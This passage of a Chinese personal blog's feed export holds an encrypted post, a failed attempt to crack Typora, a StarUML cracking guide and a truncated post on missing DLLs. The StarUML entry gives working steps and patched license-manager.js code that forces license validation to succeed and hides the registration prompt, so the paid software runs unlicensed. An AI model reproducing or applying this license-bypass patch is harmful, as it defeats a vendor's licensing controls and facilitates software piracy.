3909ad7ad9203ed43765760b4220397120a4a57fb55448a99379594754bc67872c8ffbb3ea019721f24f028d82f1742ee4caff1cc5658112f2c5d0da631e7f4b43fbfc771de1a8ec4d38060bab44d5425d42dd8f256c18615bc4e12ca0a5aa244d902097221c29a7317ff2c815c772506af20439570c4b9298499dba2e18973e4055b7dc7c0a77decb6a2302faba3ad0928f0a08220e7890cd32fb28f4faed08962114e2690bd4bd2386e61534da7fa8a4b6b662d6a5486734c21f87552cad6ef0feee957dade7a5bb43bb3fa16c5d3ec8e9c5ee32cc6c6f53142b8e9e34605dee83d98e76ea584390f2599a26656a482398c4b15bb055769e17eba2636593aee067d067c6669054c79db38a40ecef76effa5759c6e44733d44fab09a80af66485743e688d795b44d80486ce23ac5db24dd22326f2dde203676a92250b9e8798a9df3010056e218ef7812eaba59612ce04ac045fd3218c9de825ea4a893455c558d58b0dc1a8178ffd7b25e8a94cb86f78105b764538a4745fba89505eb6c39e1b6e819a3e94b0f08b7e37aa34933a27656dbafc02b8fa740bba00e6959503f4f0d68c0fba12d639ee2986d043d6882ff5ac4c7c5d1dcaf2b4b78a3419e6b5885991b7bb1015d63271fa50a05cd432b6adc79111048785ee8aca9395c28c8c26934304a71236eaaaf0739a3b16a75b4992bc91ac75917c146a057271bc10095f23745b46019358d8b9cd51f1f4787981d3a31a4de9fef43536b4c99dbb687238f59e901b5fb7bbf111acdd94c63cfac4bd4369ec12962975dc5c546a3df578fbefa5c7ada66d8453ac539644a573277fddcdf529ae141256980875c8ad27b758819eb3e975613ddf2bbb1febc2a4fb36882e7195cd0acced79ded468a69907ce5e0063ddf1e3ed06c9ab232df3145c84357ee329da368dfefe39ad411c077a0da6b6540af82e6b4fcce09f1c78e5a533dbfd990bc014a96dd0e2c0a720c52b3fdc7d2eaef3ec2204a2d0be7136527121e1897ea7f18ac53d0e9889fef16122e5f51a1df591d63be78ff35543331f78600ec75c3338084632de0c742037298448b59c42f3a5273e48ad70e2204f0a4299ff114b4e4d5089610389704213b18b68e22f32203c9dee9bc44497a607a9e5fe331a6a322987915be616271a60a93243646cd74c494878bd411b1c4714d307a1a43d834436ca730b5a81ecaa4c4ddb5a7bb63fb2f25530079115355e57cc6f0a0533e7e7f0872253be0c073c9a4ea80cf49629ac25c4ba7eb6702817f3868c7e66ce5e48a7f31f0a355fff9125212cb600a83c3ec17aed31e1b2060c881c9fe7eb3053478aa628d9106819badb03225a8ea32b9366564755dd5ec22c3d293e068743a150916874dd441492a45c33ae6c6a9efc29661975b9648d222824bc52856be663fad44ab7f17408f14c2fcf92edf97fd43c803f82d287af02f7ce2dd77519036dc3e7f6d9d1778132e34e5af461b26b497f7577175351f87ef46183093934ee2447ec3192af15a1008632a65f513615a638bd0c2bdbb8b531c8b696a216e4277f5a43ac8d2b79b6fe9910c10d9a7869cfc94c93f44b6574d27aca05c021a80de76acadba6354a67eff29dee8f232f96c79b37e9ad910d863dffa2f494d326dc2416a2fc701b1c90ece7ff1c69fc5e7eb0a865fade53179f5cc31b43609af27dd07ff44c8c6e2179f1321d919d356d2585ec4a69922e309a948473da422e1935bd7fba3cf448f7ed25c60432a76724df2912a1a9622b040a3ba7cdab8981334246f386ff031b63e1645e5d6e818e5ac3bc8120c390427c3a027a2afbccdedaac374763c30246573c63a07ab02d23de6bc0f97ec5f28064eb86331b4e997196eae67431ba55ba43e56bd3ef14a7d4c434b20454651f2c0b7214f7a0bede884e13b742de52610fdef8a394574801ae0a51da937b9060e5f8c563bc175d0d59906cd9550b7180b5ba926fdf9dcb5502fe381d9ecf9b01c77b31a6ddaccde09dbbfffdc78454bcc6f77291d6a9f56fdeea0d6f46cafef450fe0877bf1a0271af425517b1758d87ea394e148ad2854790165a1dc82a279a8d11ab1c238d7d46d68a5f8030e7fdedc8d024fbe2aeaf002d7a3801f2ca9bad13305d1e1a8802b232a95a1d09e100df7ad7c2b1931f4d6e26f4ffd4e6116908ea04c038644a4a57fedf3aa17b25b9c987636bd74c8d8383b7a737c450d2a2b74825b3cb66b3b05b97e6f31227dcbf6a2d2a16c920f1688f4f1c726e38fee61bc9825b082b835558ce492eebd8b61a22b5f43bc94f2939b1c46cef95c9104e65789897d8d9a6962251d6889320a5f3e07bcb2790a915ba0ecee071ccf65299d085686a89ac5d8c0567c26d89c4dcc889f18a46b2fa792f734f9d32808de7bdde0dc4b248cbe29ca247ad7b35f78fd759ff025ae314804f2f089c95619b78a385a743031e1d8105b2cf515b6f03091bb76d46cc042a78738b60c19414cc742d166ba47ba9af7584459a3d32d7e7f5c9d8873bf644cf0f85ff9451316adb352b0dac073c289f42e2531bb0959c67b78b3e22ff3119e1c142b586df433730480b15503a47c64920b0118b2b47bc2c263ffa49acf972aef1889c4d541733fa127f6e3bac086c5c337288efcc138c98342debb8109e3f95c87b0d98970f614bb04e2918a04de00549851dfa68fda16d817764bcc885981daf75e69c2b81d035a3ffe61d99f11f642cf670b28a96d3c9f5e7b9a2860240d7c7b783f41b1c1b81c2d979c148e1ddfb570c6d970b32f0bd47a329b4b741f46478dc4acbf37414a94e62f43143d527475cccef72444136e8be28e1b1628820ebe05a779eab78edb2871b0350361706ed6d45e4f535709d2c270ea9dcacf10103f9864d4977155afeac7465c6904e4f26351af9384f97d20ee77cdb14ff26f75b51379bfab2188cf0c49fc84f42348093ebd9f0db023b80e2c6cf37a3e56767f6f7e6251816071994a6699d05ea3583a395db55647d9a605c3466036aae7caeb361faa74fc3e7c093b290f8c678dd83605d21250375cebd9baec8082a77ac5010c3a23105d522d2f5f00d83965eee5da3894920f1f11bfebe357e9068a8a04bda3e5472204f233d084cd1c078f2184bafae1cd62173554bc6be2348944698f01b95015f5335c16c81cf5349e4d9370287211cfea6bea5ef72e33be748c61bfddb990abc0fc6a1004b25d65db9881520de45707b2f667e6023dae9e1dfeeba722e29bdefccce7b1522ec90fd51ac62e2a3aceddf1b175a4858a49fedc0c61fe9b40573976a4ede24dfee9b517218320b04878ecabe8b76d77fcab5f9974030a68936ea765b2157d07346ee91e6daa3940d95e03f2e95309cc200082dc2e8fd43ea232ded5f31e3849ed1aada95c2ea5195e9be9f3c2962461f16ef9002bb426da6083e8130d963db5c45288518aab8a28b6fe9250db660ccad4974f8cb2b13adfa6e5571a8afc03c8a31790da19a9e3e34cceeb9970b237a1ee6138bd1cfbbe2d99edc9b53a4cf9d9b3df59ff0463a517e2d0fdce276133b46591a62c13e01678d20e4e32bf61334f252b163cfd36c63b1b7e33e96e2fd13f073acbc94ac7a7e26b51847a52fadb164e78180ca5ec5008c465e6e4907d2b1d263ad907a4be05e54ee17729a9d7fa27b1594cce1e800133762784177dd822ca3cf89a09377f884a9425a31ecf8e68362e5dec5ebf80fbf08dbc5764d967effbdb092b4f8194a02b8f2edf4271251428acc94ff80ecad0c869206cd95f52ff8caa8ae7afded3d8daf2a540968ea240765c0fca5dedf7b90b987b88c689107f8442ee45566641d92f32ce6e6692a4c029278f607ebd2daa4427353952794ed13c89d2e2a386689828345cd17d1760b05052b05463cda7013ed0710aa6a05fffba98263ab63eb3910227f2de8e3442a887b99736f0b9ec63d76fdc7088a01708a71d1cecbcbf61602ab594c2e1cf8c3fc7b32dc0baf2f2cbb26786025aa7f87bebfd5edb00719ad2a6460d6af34fb0a180eb5872ef6f9b907e32cb1661235304dcccbb461736480ca30fa4e959895bf7aeaac21f68f1ee873b336e3263da1127d359082826b36753e6cb2891d021225f440f359b722d7ff234d1927ff26f53ef4b016111e07d60486d5f6a054072786ba4b164f7b94080debfa4dbfaf4b5f77eca1aed473ad5ae4ccc436aac579eb69d8f3e68ec305d699e9a2298ba6b780f6da6cdd450a1133b09c735f2a4cb67212e70217dd08c4a9b3ab5adb6022fa3958325421c0e17b68183f9847267f4be1de9f09a2072b108ae9987dc93623b1c28f06998bcc12a94aafe1a6dbbf3421fbab7dd88f6d0efe5b7cd483067f567074cfb9b271837555da29fd02d5f5dc0e7daa5160410bfe5a64097a306e28d59e0b42adc8510078f3ac5635141e76bbe2a87ca5a0894ad85cde7fe48f830035ca31aa7b7078e5422688f8e565e2f727c021ddebc33986a1f84783aea95f1bbdb1d850d17b1e85d8efd01296f032e5bad5fa9f9c71195dd3c5c44e81884902401b48ec743cfe37aae25ebcbbbf95e44c018f487009fcfb79115c382a59632a4572992073d094cacf5893c7806c9496d2c3a34ed7a67cbe7b16418d7598cf000f2e7e49747ae574c2dc8a83e187b08a697af65d6eccb74ffc10e7fdd478908cbe617542f3e3df27cf5a7759ae3c2ed831686406299851edbae70c569f16b1a604c55929300d632eeecfa05d6682e1c2e0509cbd797e4d9e9360f927fef3aaa2104e8813f9336fd2043d065f84a1840fc4475938f125b0c07002df6acb2c36d63e3840eb8cf5cf4f008671f6bd81267fe43ccfb30d539686ddc2773e4e755bafc49faf7b1ea3704a6393a732a4383fc058a44601dc3e7f91f5356c742726842b3d9e25c1d50a7f99c6e0e47f8897bbe4befb44792603ea85b2f0eb1b793737db09240f03f26d2ceeeb133be374645e33e270feb761f301416a4e60a38682284a545985653c39cf099365fb17fa2df33b3b6b960ebbb7ef2e3fe26b123a87dbf304495a7ef9b2de9ad98fa45f59bf7b73991e213fbbcc466144f973d0eb8c5838f87298c63faf4db11747edc402caf91c58c52cadb57e4355cf0883279d8466d7979a759be79cba3645e31da45a1f1a0103bde6bfdc75ca324f8ebb7cdb9450d3b007393379376566cb41542f90af73fe28300b0b4f4f506ba9902cf981c1354584e677c69d075bce390ff40b1061846ff482d0c4482b2759c327c845f1824334a837c53fbf6d43260c4a913485f8c90121260ecf21b9ead04b4fa379b9e7042816df5295db839ebc6e10a117efa1832745038a606b850f0bc852a19132443ee6ad5df58f12d1801798294177480b88d261db5ae198d81b3b4ddbc727fe6149e19b6eec99a89eb3d236d11fb63c3b144e99896c3ebc0dd1ff9ac002ba6efc2e38b3d37da92abc11c0f83b025bd9d7fce031b81a3d29f9981e120cc4da22d6cfe9d0674653e503b0ddbca54dff9f62f7714200b44d1ba7c8d5bc31ad14d82f547d97be21652dc7b1837fbf22e73da45ff74c05b360a22b7cd5e0be990755a64ecf11a27ab8330bdd17272bc86cee5c9a4a85bd1f70e92d87178e6633cf1feff383cda650ace93d46a8f1ad5388946398140c7298ab804b58847932937fe3d74f3145879997e4eaaa80ed1a72be30d41d4c129e6bb3c54034664975c580970186ad98188adfee207991e82ada520e8646a42522f9d7008aaa0f33ab55cea7e4ec21159abf2ebb092ebad6845e71a8342391fc5ca94fbf1a51795db5d4aea3dfcd9375bb373dbd15fb9ecc9429ad3244b2b394b47bfbc319005b1929932453b93e4dc5670de21b1b9e4f330ef65124e62a82484e4673dff7cf487ef25871264c88b6a3b13a1888d9c5ccffac2064fa6731fdbed417ef73395ac73671df931c56582f0f117a91272356e61673fcb925877b641bf5d9b3c95c8f6ed3209f9defa916d6b8dbb60db5408609d3b52f510cfb6427df71f9682298f584c388ff0702b288acef3c83bd9fd8e8edee5f7c3e90082893b1250e0eb2b7af1194b3107dc324127dc1be5917f506b2419797a10953cc5a6a2b67b50aab8d0f046f832fd2e803c1be8632b93c15cb38f9a9c0136fc5f88c950146a87ac4403074fd98f007c8898509d7a0abc4879fc5e9052b0ffd477e693aa550cc041db926324977c40199ccd2a6bd1b3d447a77f83b2c191cb5ea46ad61a68c0d724113f13f5bcda1ff282ad4d0c49409ca819021f8d24f0bb463cc74f918ea5790094cea5acdf82e306f6004d308f7e8941341ee5aaaaf8d65934945633eb60e090279e47148214aa5e874c595c015d68245b357ec72bef53778286158943d2f55d71843474f43a5444d52f9b2444769f1f9cd88c663a0ba6d55311ca333cb887f2ea21809f678a9a2b7da751c6e4c0aa6255d21e8be73aa0a6bda605b1bdc54bef05339a2319be8f85e4eca1cf9afa9f7f993b56f7b14da778d9a9b50ed9a56cd253890dec29c49bd3c8f5255756d6fffff24ea66c6e7921af2234555b1fbae33021a69da31a23ea8a02ead43c86f6a23442a7c88465c77e77c1c8319c51c4cf2982e8eb4a920a3950e56ab3b3710274cfb903a80864a2159d59d4caa5fd67efafff37e0b877b5d6411aea2a94ca08a31eb64bbd477d98ebbc6128a97c3290b2bf32188e7e3f0c1c8f670014ec74d0ba78128fa6c62684f30f72bce659cd42ecfeaf0b2d8f0750377134967493e14d021fafd815453227ba37d0720e05a2bcc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】typora</title>
      <link href="/2022/10/08/typora%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/10/08/typora%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>从Typora发布1.0版本开始正式宣布进入收费时代，大概是89软妹币共三个设备使用。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为之前破解过startuml，发现typora的文件结构也有点相似，同样也存在一个<code>app.asar</code>，也就是js用的electron框架弄的桌面版软件。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><hr><h2 id="1-自己尝试"><a href="#1-自己尝试" class="headerlink" title="1. 自己尝试"></a>1. 自己尝试</h2><p>准备工作</p><ol><li>下载安装一个typora</li><li>下载一个nodejs，因为要用到npm</li><li>git bash，是安装git之后的一个</li></ol><p><strong>安装完没啥事建议重启下</strong></p><p>打开<code>git bash</code>，查看<code>node -v</code>，就提示就好办了<br>然后输入<code>npm install -g asar</code>，下载完就ok</p><p>下面部分操作均在<code>git bash</code>进行，powershell和cmd理论也可以。<br>cd到typora安装目录，例如我这是<code>D:\Typora\resources</code><br>把app.asar反编译出来<code>asar extract app.asar app</code><br>app目录下就三个文件，这个atom.js不知道，搜索一下应该是个拓展，好像是补齐用的。<br>至于这个main.node在package.json里面有个main就是引用了这个文件，但是这个文件打开是一个乱码或者加密的情况。不过大致可以确认关键点在这个文件上面。<br>而那个json记录的配置信息反而没啥看点。</p><p>由于是加密过的，我的技术肯定干不了，搜索了一番之后可以得到两个结论</p><ol><li>替换app.asar的基本都是干掉typora这个版本的加密算法了。<ul><li>每个小版本的动态算法可能会有改变，百度有一篇看雪的底下评论有提到，所以能搞这个的基本都是对加密算法感兴趣的了</li></ul></li><li>添加dll的基本都是hook跳过加密解密了。<ul><li>hook在计算机下被称为挂钩或者钩子，思想就是把一些信息钩住用自己的代码执行一下然后在放行，在这期间肯定是修改或者进行一些别的操作了。</li></ul></li></ol><p><strong>显然我不具备这样的能力</strong></p><p>关于看雪的这篇<a href="https://bbs.pediy.com/thread-272538.htm">文章</a>也推荐大家去看看，能get到几个思想就行，其他的各凭本事。</p><hr><h2 id="2-简书上有个办法"><a href="#2-简书上有个办法" class="headerlink" title="2. 简书上有个办法"></a>2. 简书上有个办法</h2><p><a href="https://www.jianshu.com/p/d8baf921c9f4">文章链接</a></p><p><strong>可惜的是！他被ban了</strong><br>哎，作者工具被ban了那就没办法了，文章的思路应该就是解密之类的，有个许可证我到不是很了解。<br>只能老老实实用网上的办法了，不过感觉还是替换asar靠谱点，dll我不太放心。。真没办法那也只能用dll了。</p><hr><h2 id="3-最后的最后"><a href="#3-最后的最后" class="headerlink" title="3. 最后的最后"></a>3. 最后的最后</h2><p>还是用现成的了哈哈。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>首先可以瞅瞅目录，有类似<code>resources</code>这样的目录，且下面还有个<code>app.asar</code>基本都是利用electron框架弄的了</li><li>虽然知道可以反编译这个.asar，但是核心还是在绕过或者解密上</li><li>startuml是真的放心啊。。。他那个直接反编译之后能看到源代码，你只需有一定代码基础，把那些地方改了注释掉就行了。</li></ol><p>再接再厉吧。。。正向开发都没搞明白，逆向纯属是瞎闹哈。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】starUml</title>
      <link href="/2022/10/04/starUml/"/>
      <url>/2022/10/04/starUml/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学到uml设计，而最新的startUML好像因为卖给别的团队收费了。然后搜了一下破解，貌似也不难。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>时序图（Sequence Diagram），又名序列图、循序图，是一种UML交互图。它通过描述对象之间发送消息的时间顺序显示多个对象之间的动态协作。它可以表示用例的行为顺序，当执行一个用例行为时，其中的每条消息对应一个类操作或状态机中引起转换的触发事件。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><a href="https://staruml.io/download">官网下载uml</a><br><a href="https://nodejs.org/zh-cn/download/">nodjs</a></p><blockquote><p>不过因为我博客就用到nodejs了所以不用再安装了</p></blockquote><hr><h2 id="干活"><a href="#干活" class="headerlink" title="干活"></a>干活</h2><p><strong>原理好像是可以被反编译，然后改变逻辑。</strong></p><p>安装完nodejs之后也就是要用到npm，用cmd或者powershell打开都行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line"><span class="meta">#</span><span class="language-bash">依次打印一下，有显示版本号就行，没有就重启下</span></span><br></pre></td></tr></table></figure><p>能显示版本就可以安装asar了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g asar</span><br></pre></td></tr></table></figure><p>然后cd到staruml的路径去解包<br>这边官方安装默认是在<code>C:\Program Files\StarUML\resources\</code>这么一个情况。</p><p>所以我们只需要在powershell或者cmd【但是因为我有git bash之类的所以就没用windows这些】<br>cd 到这个路径下就行</p><img src="/2022/10/04/starUml/000.png" class=""><p>路劲切换后，使用<code>asar extract app.asar app</code>进行解包到文件夹。</p><p><strong>注意如果出现一些错误可能是权限不够</strong><br>比如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\StarUML\resources&gt;asar extract app.asar app</span><br><span class="line">internal/fs/utils.js:<span class="number">314</span></span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">    ^</span><br><span class="line"> </span><br><span class="line">Error: EPERM: operation not permitted, mkdir <span class="string">&#x27;app&#x27;</span></span><br></pre></td></tr></table></figure><p>权限不够就把这个文件拖出去，放到别的地方解包修改在打包拿回去覆盖。</p><p>因为前面的路径不一就不管了，反正找到<code>app\src\engine\license-manager.js</code>的这个文件，用记事本或者notepad之类的打开。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">checkLicenseValidity () &#123;</span><br><span class="line">  <span class="keyword">if</span> (packageJSON.<span class="property">config</span>.<span class="property">setappBuild</span>) &#123;</span><br><span class="line">    <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">validate</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//修改下面那句的false改成true，最后一句注释掉</span></span><br><span class="line"><span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">      <span class="comment">//UnregisteredDialog.showDialog()</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check the license key in server and store it as license.key file in local</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">licenseKey</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">register (licenseKey) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    $.<span class="title function_">post</span>(app.<span class="property">config</span>.<span class="property">validation_url</span>, &#123;<span class="attr">licenseKey</span>: licenseKey&#125;)</span><br><span class="line">      .<span class="title function_">done</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">product</span> === packageJSON.<span class="property">config</span>.<span class="property">product_id</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> file = path.<span class="title function_">join</span>(app.<span class="title function_">getUserPath</span>(), <span class="string">&#x27;/license.key&#x27;</span>)</span><br><span class="line">          fs.<span class="title function_">writeFileSync</span>(file, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data, <span class="number">2</span>))</span><br><span class="line">          licenseInfo = data</span><br><span class="line">          <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">          <span class="title function_">resolve</span>(data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">false</span>)</span><br><span class="line">          <span class="title function_">reject</span>(<span class="string">&#x27;unmatched&#x27;</span>) <span class="comment">/* License is for old version */</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">fail</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">        <span class="comment">//下面的注释掉</span></span><br><span class="line">        <span class="comment">//if (err.status === 499) &#123; /* License key not exists */</span></span><br><span class="line">          <span class="comment">//reject(&#x27;invalid&#x27;)</span></span><br><span class="line">        <span class="comment">//&#125; else &#123;</span></span><br><span class="line">         <span class="comment">// reject()</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完之后保存<br>然后重新打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar pack app app.asar</span><br></pre></td></tr></table></figure><p>生成后，在这个文件夹看看app.asar的修改时间是不是最近的，如果是基本就没啥问题了。</p><p>然后黏贴覆盖掉<code>C:\Program Files\StarUML\resources\app.asar</code>这个原文件。</p><p>替换原始 app.asar之后，重新打开 StarUML，不提示需要注册和没有 Unregistered 标识则表示破解成功。</p><hr><h2 id="新旧ui对比"><a href="#新旧ui对比" class="headerlink" title="新旧ui对比"></a>新旧ui对比</h2><img src="/2022/10/04/starUml/001.png" class=""><img src="/2022/10/04/starUml/002.png" class=""><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>角色（Actor）</li><li>对象（Object）</li><li>生命线（Lifeline）</li><li>控制焦点（Focus of Control）</li><li>消息（Message）</li></ul><table><thead><tr><th>类型</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>Alt</td><td>抉择</td><td>包含一个片段列表，这些片段包含备选消息序列。可以在每个片段中都设置一个临界来指示该片段可以运行的条件。else的临界指示其他任何临界都不为true时应运行的片段。如果所有临界都为false并且没有else，则不执行任何片段</td></tr><tr><td>Opt</td><td>选项</td><td>包含一个可能发生或可能不发生的序列。可以在临界中指定序列发生的条件</td></tr><tr><td>Loop</td><td>循环</td><td>片段重复一定次数。可以在临界中指示片段重复的条件。Loop组合片段具有Min和Max属性，它们指示片段可以重复的最小和最大次数。默认值是无限制</td></tr><tr><td>Break</td><td>中断</td><td>如果执行此片段，则放弃序列的其余部分。可以使用临界来指示发生中断的条件</td></tr><tr><td>Par</td><td>并行</td><td>并行处理。片段中的事件可以交错</td></tr><tr><td>Critical</td><td>关键</td><td>用在Par或Seq片段中，指示此片段中的消息不得与其他消息交错</td></tr><tr><td>Seq</td><td>弱顺序</td><td>有两个或更多操作数片段。涉及同一生命线的消息必须按片段的顺序发生。如果消息涉及的生命线不同，则来自不同片段的消息可能会并行交错</td></tr><tr><td>Strict</td><td>强顺序</td><td>有两个或更多操作数片段。这些片段必须按给定顺序发生</td></tr><tr><td>Consider</td><td>考虑</td><td>指定此片段描述的消息列表。其他消息可发生在运行的系统中，但对此描述来说意义不大</td></tr><tr><td>Ignore</td><td>忽略</td><td>指定此片段未描述的消息列表。这些消息可发生在运行的系统中，但对此描述来说意义不大。在Message属性中键入该列表</td></tr><tr><td>Assert</td><td>断言</td><td>操作数片段指定唯一有效的序列。通常用在Consider或Ignore片段中</td></tr><tr><td>Neg</td><td>否定</td><td>此片段中显示的序列不得发生。通常用在Consider或Ignore片段中</td></tr></tbody></table><p>精髓我感觉还是制作成类视图，然后绘制时序图，比如这个项目如何启动，有哪些功能，什么条件触发之类的。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>新版的文件尾缀都是mdj了，老版的好像才是uml。<br>此外就是一些功能和属性上的变动，新旧存在一定差异。</p><p>题外话，好像可以找到最原始的时候团队没出售这个项目的免费版。虽然那个好像很老了，最新更改时间可能都是2005年的了。但是使用的话倒是无所谓。<br>而且绘制时序图也不一定要用到这个软件，估计还有类似的。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dll缺失</title>
      <link href="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/"/>
      <url>/2022/10/01/dll%E7%BC%BA%E5%A4%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="dll缺失"><a href="#dll缺失" class="headerlink" title="dll缺失"></a>dll缺失</h1><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先回顾，什么是dll，<code>.dll，动态链接库英文为DLL，是Dynamic Link Library的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</code><br><strong>windows下的动态链接库是以.dll文件，而linux下的动态链接库是以.so文件</strong></p><p>dll缺失在windwos下并不算稀奇。<br>比如你开发的程序使用的dll是依赖windows的，而导出给别人的时候，他的电脑就可能没有这么个dll，致使程序无法启动并且报错</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/000.png" class=""><hr><h2 id="解决方案1"><a href="#解决方案1" class="headerlink" title="解决方案1"></a>解决方案1</h2><p>对于内部开发的程序，谁开发的找谁，他电脑上肯定有这个dll文件</p><p>这里推荐使用<code>everything</code>，当这个程序检索完硬盘之后，你可以直接搜，也省得自己慢慢翻了。</p><p><strong>我这里演示的是用utools下的everything拓展所以看起来不一样</strong><br>但是实际效果差不多的。检索完磁盘-搜索文件名-右击打开路径就行</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/001.png" class=""><p>可以看到有不少同名的，概率是架构不同所使用的dll。不放心就全带走。</p><hr><h2 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2"></a>解决方案2</h2><p>自然是百度，缺啥百度啥，一般找微软官方的下载地址就行<br>或者直接下个vs，把c++桌面端开发的组件下过来<br>当前前者只下对于的dll文件肯定比后者下开发组件要节约空间</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/002.png" class=""><p>这种dll单个下起来可能不好找，不过一般也没改的，所以第三方注意别下载广告也凑合用的。</p><p>剩下的就是路径，看网站描述吧，有些dll要放到系统目录下才生效比较麻烦。</p><hr><h1 